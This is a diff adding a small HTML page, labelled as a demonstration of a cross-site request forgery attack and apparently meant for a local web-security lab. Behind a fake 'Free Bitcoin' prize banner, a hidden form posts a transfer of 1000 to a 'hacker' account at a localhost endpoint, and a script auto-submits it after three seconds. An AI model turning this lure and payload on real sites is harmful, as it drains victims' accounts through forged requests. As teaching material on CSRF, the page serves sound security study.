@@ -1,0 +1,33 @@
+<!DOCTYPE html>
+<!-- DEMONSTRATION: CSRF Attack Page -->
+<html>
+<head>
+    <title>Free Bitcoin!</title>
+    <style>
+        body { font-family: Arial, sans-serif; text-align: center; padding: 50px; }
+        .banner { background: #ffebee; padding: 20px; border-radius: 10px; }
+        .hidden { display: none; }
+    </style>
+</head>
+<body>
+    <div class="banner">
+        <h1>🎉 You Won Free Bitcoin! 🎉</h1>
+        <p>Click the button to claim your prize!</p>
+        <button onclick="document.getElementById('attack').submit()">Claim Now</button>
+    </div>
+
+    <!-- Hidden CSRF Attack Form -->
+    <form id="attack" class="hidden" action="http://127.0.0.1:8000/transfer/" method="POST">
+        <input type="hidden" name="to_account" value="hacker">
+        <input type="hidden" name="amount" value="1000">
+        <!-- No CSRF token = attack will work against vulnerable page -->
+    </form>
+
+    <script>
+        // Auto-submit in 3 seconds if user doesn't click
+        setTimeout(() => {
+            document.getElementById('attack').submit();
+        }, 3000);
+    </script>
+</body>
+</html>
